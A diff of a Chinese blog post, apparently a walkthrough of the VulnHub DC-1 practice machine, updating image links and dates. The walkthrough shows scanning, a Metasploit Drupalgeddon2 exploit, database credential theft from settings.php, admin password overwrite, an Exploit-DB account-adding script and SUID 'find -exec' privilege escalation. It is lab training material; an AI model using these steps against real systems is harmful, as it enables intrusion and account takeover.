@@ -101,7 +101,7 @@ Xyan =  = 春風吹破英雄夢，歲月磨平少年心</title>
 
       </div>
       <div id="imgs" class="pjax">
-          <img src="https://tva1.sinaimg.cn/large/007dFS7lly8h7r37jfz4qj31hc0u010w.jpg">
+          <img src="https://s2.loli.net/2024/03/03/mP1bS8VJZdsgQne.png">
       </div>
     </header>
     <div id="waves">
@@ -151,67 +151,66 @@ Xyan =  = 春風吹破英雄夢，歲月磨平少年心</title>
 <h1 id="靶机下载"><a class="markdownIt-Anchor" href="#靶机下载">#</a> 靶机下载</h1>
 <p>下载地址为 https://download.vulnhub.com/dc/DC-1.zip<br>
  可在 https://download.vulnhub.com 查看相关下载<br>
-攻击机为 kali2022<br>
- 两机均用 nat 连接</p>
+攻击机为 kali2022 (版本忘了)</p>
 <h1 id="渗透过程"><a class="markdownIt-Anchor" href="#渗透过程">#</a> 渗透过程</h1>
 <h2 id="flag1"><a class="markdownIt-Anchor" href="#flag1">#</a> flag1</h2>
 <p>打开 kali 扫描靶机</p>
-<figure class="highlight raw"><figcaption data-lang=""></figcaption><table><tr><td data-num="1"></td><td><pre>arp-scan -l</pre></td></tr></table></figure><p><img data-src="https://tva4.sinaimg.cn/large/007dFS7lly8h7r6tgjanfj30kb054dh3.jpg" alt=""><br>
+<figure class="highlight raw"><figcaption data-lang=""></figcaption><table><tr><td data-num="1"></td><td><pre>arp-scan -l</pre></td></tr></table></figure><p><img data-src="https://s2.loli.net/2024/03/03/YSRZQv76aM4heyD.png" alt=""><br>
 也可以使用 nmap 扫描 (此处请根据实际修改 IP)</p>
-<figure class="highlight raw"><figcaption data-lang=""></figcaption><table><tr><td data-num="1"></td><td><pre>ifconfig</pre></td></tr><tr><td data-num="2"></td><td><pre>nmap -sP 192.168.232.0&#x2F;24</pre></td></tr></table></figure><p><img data-src="https://tva1.sinaimg.cn/large/007dFS7lly8h7r6tnpodaj30hz0hrwi3.jpg" alt=""><br>
+<figure class="highlight raw"><figcaption data-lang=""></figcaption><table><tr><td data-num="1"></td><td><pre>ifconfig</pre></td></tr><tr><td data-num="2"></td><td><pre>nmap -sP 192.168.232.0&#x2F;24</pre></td></tr></table></figure><p><img data-src="https://s2.loli.net/2024/03/03/mnOLTq2S1xCc9fv.png" alt=""><br>
 发现目标主机后扫描开放端口</p>
-<figure class="highlight raw"><figcaption data-lang=""></figcaption><table><tr><td data-num="1"></td><td><pre>nmap -sV -A 192.168.232.133</pre></td></tr></table></figure><p><img data-src="https://tva2.sinaimg.cn/large/007dFS7lly8h7r6tq4q65j30n00leq8f.jpg" alt=""><br>
-发现开启了 80 端口，访问 ip 查看页面信息<br>
-<img data-src="https://tva4.sinaimg.cn/large/007dFS7lly8h7r6urp8tyj313q0fqq54.jpg" alt=""><br>
+<figure class="highlight raw"><figcaption data-lang=""></figcaption><table><tr><td data-num="1"></td><td><pre>nmap -sV -A 192.168.232.133</pre></td></tr></table></figure><p><img data-src="https://s2.loli.net/2024/03/03/NpBLxWrjmJ2KTvf.png" alt=""><br>
+发现开启了 80 端口，访问查看页面信息<br>
+<img data-src="https://s2.loli.net/2024/03/03/DhjOsZmay5Uior1.png" alt=""><br>
 通过 Wappalyzer 发现网站 CMS 为 Drupal<br>
  使用 msf 进行渗透</p>
-<figure class="highlight raw"><figcaption data-lang=""></figcaption><table><tr><td data-num="1"></td><td><pre>msfconsole</pre></td></tr><tr><td data-num="2"></td><td><pre>search Drupal</pre></td></tr></table></figure><p><img data-src="https://tva2.sinaimg.cn/large/007dFS7lly8h7r6vde7ujj30v108atbb.jpg" alt=""><br>
+<figure class="highlight raw"><figcaption data-lang=""></figcaption><table><tr><td data-num="1"></td><td><pre>msfconsole</pre></td></tr><tr><td data-num="2"></td><td><pre>search Drupal</pre></td></tr></table></figure><p><img data-src="https://s2.loli.net/2024/03/03/2NDkmv9Ff4JC83s.png" alt=""><br>
 用较新的漏洞进行尝试</p>
-<figure class="highlight raw"><figcaption data-lang=""></figcaption><table><tr><td data-num="1"></td><td><pre>use exploit&#x2F;unix&#x2F;webapp&#x2F;drupal_druopalgeddon2</pre></td></tr><tr><td data-num="2"></td><td><pre>show options</pre></td></tr><tr><td data-num="3"></td><td><pre>set RHOSTS 192.168.232.131</pre></td></tr><tr><td data-num="4"></td><td><pre>run</pre></td></tr></table></figure><p><img data-src="https://tva3.sinaimg.cn/large/007dFS7lly8h7r70q4gx2j30v80gadiu.jpg" alt=""><br>
+<figure class="highlight raw"><figcaption data-lang=""></figcaption><table><tr><td data-num="1"></td><td><pre>use exploit&#x2F;unix&#x2F;webapp&#x2F;drupal_druopalgeddon2</pre></td></tr><tr><td data-num="2"></td><td><pre>show options</pre></td></tr><tr><td data-num="3"></td><td><pre>set RHOSTS 192.168.232.131</pre></td></tr><tr><td data-num="4"></td><td><pre>run</pre></td></tr></table></figure><p><img data-src="https://s2.loli.net/2024/03/03/FVwaOlKpsXeqNxr.png" alt=""><br>
 成功得到 shell，使用 py 得到交互 shell</p>
 <figure class="highlight raw"><figcaption data-lang=""></figcaption><table><tr><td data-num="1"></td><td><pre>shell</pre></td></tr><tr><td data-num="2"></td><td><pre>python -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</pre></td></tr></table></figure><p>查看文件目录发现第一个 flag 执行 cat 命令查看内容<br>
-<img data-src="https://tva2.sinaimg.cn/large/007dFS7lly8h7r6vtw46ij30gp06cdh3.jpg" alt=""></p>
+<img data-src="https://s2.loli.net/2024/03/03/b2nfOFo7erZ3R1g.png" alt=""></p>
 <h2 id="flag2"><a class="markdownIt-Anchor" href="#flag2">#</a> flag2</h2>
 <p>该 flag 提示查找 Drupal 框架配置文件</p>
 <div class="note info">
 <p>Drupal 默认数据库配置连接–&gt;/sites/default/settings.php</p>
 </div>
 <p>直接 cd 到该目录下查看</p>
-<figure class="highlight raw"><figcaption data-lang=""></figcaption><table><tr><td data-num="1"></td><td><pre>cd &#x2F;var&#x2F;www&#x2F;sites&#x2F;default</pre></td></tr><tr><td data-num="2"></td><td><pre>ls</pre></td></tr><tr><td data-num="3"></td><td><pre>cat settings.php</pre></td></tr></table></figure><p><img data-src="https://tva2.sinaimg.cn/large/007dFS7lly8h7r6w11qo6j30cp0ay752.jpg" alt=""></p>
+<figure class="highlight raw"><figcaption data-lang=""></figcaption><table><tr><td data-num="1"></td><td><pre>cd &#x2F;var&#x2F;www&#x2F;sites&#x2F;default</pre></td></tr><tr><td data-num="2"></td><td><pre>ls</pre></td></tr><tr><td data-num="3"></td><td><pre>cat settings.php</pre></td></tr></table></figure><p><img data-src="https://s2.loli.net/2024/03/03/TeFQhtoHcvd7LKn.png" alt=""></p>
 <h2 id="flag3"><a class="markdownIt-Anchor" href="#flag3">#</a> flag3</h2>
 <p>在 flag2 里发现了数据库用户和密码，连接一手</p>
 <figure class="highlight raw"><figcaption data-lang=""></figcaption><table><tr><td data-num="1"></td><td><pre>mysql -udbuser -pR0ck3t</pre></td></tr></table></figure><p>select * from users 查询得 admin 账户<br>
-<img data-src="https://tva4.sinaimg.cn/large/007dFS7lly8h7r6wbj2g6j30kv07vq43.jpg" alt=""><br>
+<img data-src="https://s2.loli.net/2024/03/03/azoZ2lUg6cP9DM7.png" alt=""><br>
 由于得到的密码是密文，无法直接登录，这里有两种方法解决<br>
 方法一：更改账户密码<br>
 使用 Drupal 对数据库的加密方法，加密脚本位置在网站根目录下的 scripts 下<br>
 回到 /var/www 路径下，运行这个 password-hash.sh 加密脚本，得到新密码</p>
-<figure class="highlight raw"><figcaption data-lang=""></figcaption><table><tr><td data-num="1"></td><td><pre>cd &#x2F;var&#x2F;www</pre></td></tr><tr><td data-num="2"></td><td><pre>php scripts&#x2F;password-hash.sh 114514</pre></td></tr></table></figure><p><img data-src="https://tva3.sinaimg.cn/large/007dFS7lly8h7r6wdpvp6j30l9021aac.jpg" alt=""><br>
-将密文更改密码 (此处建议恶补 sql 语句)</p>
-<figure class="highlight raw"><figcaption data-lang=""></figcaption><table><tr><td data-num="1"></td><td><pre>update users set pass&#x3D;&#39;$S$Db1FwryLsYBPfvEpR870QjGzJfPi64teqeVZrAZyjMh7HND&#x2F;Ca4q&#39; where uid&#x3D;1;</pre></td></tr></table></figure><p><img data-src="https://tva2.sinaimg.cn/large/007dFS7lly8h7r6wgbk4yj30mf01yaai.jpg" alt=""><br>
+<figure class="highlight raw"><figcaption data-lang=""></figcaption><table><tr><td data-num="1"></td><td><pre>cd &#x2F;var&#x2F;www</pre></td></tr><tr><td data-num="2"></td><td><pre>php scripts&#x2F;password-hash.sh 114514</pre></td></tr></table></figure><p><img data-src="https://s2.loli.net/2024/03/03/iUQAG97hIzroEu5.png" alt=""><br>
+将密文更改密码 (此处需要临时抱佛脚回忆一下 sql 语句)</p>
+<figure class="highlight raw"><figcaption data-lang=""></figcaption><table><tr><td data-num="1"></td><td><pre>update users set pass&#x3D;&#39;$S$Db1FwryLsYBPfvEpR870QjGzJfPi64teqeVZrAZyjMh7HND&#x2F;Ca4q&#39; where uid&#x3D;1;</pre></td></tr></table></figure><p><img data-src="https://s2.loli.net/2024/03/03/3JYMq2bOx9gcZis.png" alt=""><br>
 回到靶机 80 端口开放的页面进行登录，<br>
 在 Dashboard 得到第三个 flag<br>
 Special PERMS will help FIND the passwd - but you’ll need to -exec that command to work out how to get what’s in the shadow.<br>
-<img data-src="https://tva1.sinaimg.cn/large/007dFS7lly8h7r6wibgldj30u10enmyq.jpg" alt=""><br>
-<img data-src="https://tva3.sinaimg.cn/large/007dFS7lly8h7r6wl7u4oj30ji04idfy.jpg" alt=""><br>
+<img data-src="https://s2.loli.net/2024/03/03/o6USICZFxbweqju.png" alt=""><br>
+<img data-src="https://s2.loli.net/2024/03/03/txkJg1VudXMSGcR.png" alt=""><br>
  方法二：利用漏洞添加账户</p>
 <div class="note info">
 <p>SearchSploit 是一个用于搜索 Exploit-DB 漏洞数据的命令行工具，它可以允许你离线 Exploit 数据库，这样你就可以在本地执行离线搜索，这对于有时候不能联网的渗透工作非常的有用。</p>
 </div>
 <p>之前使用 Wappalyzer 知道 drupal 版本为 7.2<br>
  利用 searchsploit 进行攻击</p>
-<figure class="highlight raw"><figcaption data-lang=""></figcaption><table><tr><td data-num="1"></td><td><pre>searchsploit drupal</pre></td></tr><tr><td data-num="2"></td><td><pre>python &#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;php&#x2F;webapps&#x2F;34992.py -t http:&#x2F;&#x2F;192.168.232.133 -u admin2 -p 114514</pre></td></tr></table></figure><p><img data-src="https://tva1.sinaimg.cn/large/007dFS7lly8h7rwps4awpj30q60lstbk.jpg" alt=""></p>
+<figure class="highlight raw"><figcaption data-lang=""></figcaption><table><tr><td data-num="1"></td><td><pre>searchsploit drupal</pre></td></tr><tr><td data-num="2"></td><td><pre>python &#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;php&#x2F;webapps&#x2F;34992.py -t http:&#x2F;&#x2F;192.168.232.133 -u admin2 -p 114514</pre></td></tr></table></figure><p><img data-src="https://s2.loli.net/2024/03/03/lkpJHOr4ySnUVxW.png" alt=""></p>
 <div class="note info">
 <p>这里使用 py2 的原因是 py2 对于 print 的使用不严<br>
 如果在使用以上命令有报错可以尝试声明 python2</p>
 </div>
 <p>重新登录一下 mysql 查看，发现用户已经添加了<br>
-<img data-src="https://tva1.sinaimg.cn/large/007dFS7lly8h7rwqh9q6vj30h206yjsm.jpg" alt=""></p>
+<img data-src="https://s2.loli.net/2024/03/03/X2jEkCfZrtv3Jdn.png" alt=""></p>
 <h2 id="flag4"><a class="markdownIt-Anchor" href="#flag4">#</a> flag4</h2>
 <p>flag 的提示词是 passwd、-exec、shadow，看一下 /etc/passwd, 发现 flag4<br>
  看一下 /home/flag4 的文件，尝试 cat flag4/flag4.txt，拿到 flag4，发现提示我们将权限提升到 root<br>
-<img data-src="https://tva2.sinaimg.cn/large/007dFS7lly8h7rwqlc992j30gx0c3q63.jpg" alt=""><br>
-<img data-src="https://tva3.sinaimg.cn/large/007dFS7lly8h7rwt9jsdqj30ep02emxd.jpg" alt=""><br>
+<img data-src="https://s2.loli.net/2024/03/03/9Q1wlvz7PDWx2rm.png" alt=""><br>
+<img data-src="https://s2.loli.net/2024/03/03/pYgNjl3UWxhn5df.png" alt=""><br>
  根据提示把权限提升至 root, 进行 SUID 提权</p>
 <div class="note info">
 <p>什么是 suid？suid 全称是 Set owner User ID up on execution。这是 Linux 给可执行文件的一个属性。通俗的理解为其他用户执行这个程序的时候可以用该程序所有者 / 组的权限。需要注意的是，只有程序的所有者是 0 号或其他 super user，同时拥有 suid 权限，才可以提权。<br>
@@ -229,12 +228,12 @@ Probably. But perhaps it’s not that easy.  Or maybe it is?<br>
 可能。但也许不是那么容易。或许是这样？</p>
 <h2 id="flag5"><a class="markdownIt-Anchor" href="#flag5">#</a> flag5</h2>
 <p>首先找一下有 SUID 权限的文件</p>
-<figure class="highlight raw"><figcaption data-lang=""></figcaption><table><tr><td data-num="1"></td><td><pre>find &#x2F; -perm -4000</pre></td></tr></table></figure><p><img data-src="https://tva4.sinaimg.cn/large/007dFS7lly8h7rwqxsio0j30ev0b7403.jpg" alt=""><br>
+<figure class="highlight raw"><figcaption data-lang=""></figcaption><table><tr><td data-num="1"></td><td><pre>find &#x2F; -perm -4000</pre></td></tr></table></figure><p><img data-src="https://s2.loli.net/2024/03/03/y8oJPU59xznef6V.png" alt=""><br>
 看到 find 命令有 SUID 权限，所以这里可以利用 find 命令进行提权<br>
 用 find 命令包含的 - exec 参数进行提权</p>
 <figure class="highlight raw"><figcaption data-lang=""></figcaption><table><tr><td data-num="1"></td><td><pre>find &#x2F;var&#x2F;www -exec &quot;&#x2F;bin&#x2F;sh&quot; \;</pre></td></tr></table></figure><p>这个命令中的 /bin/sh 是 linux 内核和用户之间的命令解释器，由此完成提权<br>
 得到最后一个 flag<br>
-<img data-src="https://tva1.sinaimg.cn/large/007dFS7lly8h7rwr3veq8j30gn0aawg2.jpg" alt=""><br>
+<img data-src="https://s2.loli.net/2024/03/03/KlME2RiFVIYzQsL.png" alt=""><br>
 thefinalflag:<br>
 Well done!!!<br>
 Hopefully you’ve enjoyed this and learned some new skills.<br>
@@ -259,7 +258,7 @@ by contacting me via Twitter - @DCAU7<br>
       <i class="ic i-calendar-check"></i>
     </span>
     <span class="text">更新於</span>
-    <time title="修改時間：2022-11-03 14:12:44" itemprop="dateModified" datetime="2022-11-03T14:12:44+08:00">2022-11-03</time>
+    <time title="修改時間：2024-03-03 02:49:19" itemprop="dateModified" datetime="2024-03-03T02:49:19+08:00">2024-03-03</time>
   </span>
   <span id="2022/03/06/渗透/DC-1/" class="item leancloud_visitors" data-flag-title="Vulnhub DC1" title="閱讀次數">
       <span class="icon">
@@ -315,11 +314,19 @@ by contacting me via Twitter - @DCAU7<br>
 
 <div class="post-nav">
     <div class="item left">
+      
+
+  <a href="/2021/11/08/%E6%B8%97%E9%80%8F/dedecms02/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;s2.loli.net&#x2F;2024&#x2F;03&#x2F;03&#x2F;zoVclQ5h6wng1UT.png" title="织梦系统渗透测试贰">
+  <span class="type">上一篇</span>
+  <span class="category"><i class="ic i-flag"></i> 渗透</span>
+  <h3>织梦系统渗透测试贰</h3>
+  </a>
+
     </div>
     <div class="item right">
       
 
-  <a href="/2022/06/04/Python/ubuntu%E7%B3%BB%E7%BB%9F%E9%85%8D%E7%BD%AEpython/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;tva4.sinaimg.cn&#x2F;large&#x2F;007dFS7lly8h447qmecvpj31110kudjz.jpg" title="ubuntu系统配置python">
+  <a href="/2022/06/04/Python/ubuntu%E7%B3%BB%E7%BB%9F%E9%85%8D%E7%BD%AEpython/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;s2.loli.net&#x2F;2024&#x2F;03&#x2F;03&#x2F;metF6NsgdTjzkrK.png" title="ubuntu系统配置python">
   <span class="type">下一篇</span>
   <span class="category"><i class="ic i-flag"></i> Python</span>
   <h3>ubuntu系统配置python</h3>
@@ -345,7 +352,7 @@ by contacting me via Twitter - @DCAU7<br>
       </div>
       <div class="related panel pjax" data-title="系列文章">
         <ul>
-          <li class="active"><a href="/2022/03/06/%E6%B8%97%E9%80%8F/DC-1/" rel="bookmark" title="Vulnhub DC1">Vulnhub DC1</a></li><li><a href="/2022/07/06/%E6%B8%97%E9%80%8F/dedecms01/" rel="bookmark" title="织梦系统渗透测试壹">织梦系统渗透测试壹</a></li><li><a href="/2022/07/08/%E6%B8%97%E9%80%8F/dedecms02/" rel="bookmark" title="织梦系统渗透测试贰">织梦系统渗透测试贰</a></li><li><a href="/2022/09/18/%E6%B8%97%E9%80%8F/cobalt/" rel="bookmark" title="CS实现宏病毒植入">CS实现宏病毒植入</a></li><li><a href="/2022/11/05/%E6%B8%97%E9%80%8F/rearch/" rel="bookmark" title="渗透复现任务A">渗透复现任务A</a></li>
+          <li><a href="/2021/11/06/%E6%B8%97%E9%80%8F/dedecms01/" rel="bookmark" title="织梦系统渗透测试壹">织梦系统渗透测试壹</a></li><li><a href="/2021/11/08/%E6%B8%97%E9%80%8F/dedecms02/" rel="bookmark" title="织梦系统渗透测试贰">织梦系统渗透测试贰</a></li><li class="active"><a href="/2022/03/06/%E6%B8%97%E9%80%8F/DC-1/" rel="bookmark" title="Vulnhub DC1">Vulnhub DC1</a></li><li><a href="/2022/09/18/%E6%B8%97%E9%80%8F/cobalt/" rel="bookmark" title="CS实现宏病毒植入">CS实现宏病毒植入</a></li><li><a href="/2022/11/05/%E6%B8%97%E9%80%8F/rearch/" rel="bookmark" title="渗透课程复现任务">渗透课程复现任务</a></li>
         </ul>
       </div>
       <div class="overview panel" data-title="本站概覽">
@@ -423,10 +430,12 @@ by contacting me via Twitter - @DCAU7<br>
 
   <ul id="quick">
     <li class="prev pjax">
+        <a href="/2021/11/08/%E6%B8%97%E9%80%8F/dedecms02/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a>
     </li>
     <li class="up"><i class="ic i-arrow-up"></i></li>
     <li class="down"><i class="ic i-arrow-down"></i></li>
     <li class="next pjax">
+        <a href="/2022/06/04/Python/ubuntu%E7%B3%BB%E7%BB%9F%E9%85%8D%E7%BD%AEpython/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a>
     </li>
     <li class="percent"></li>
   </ul>
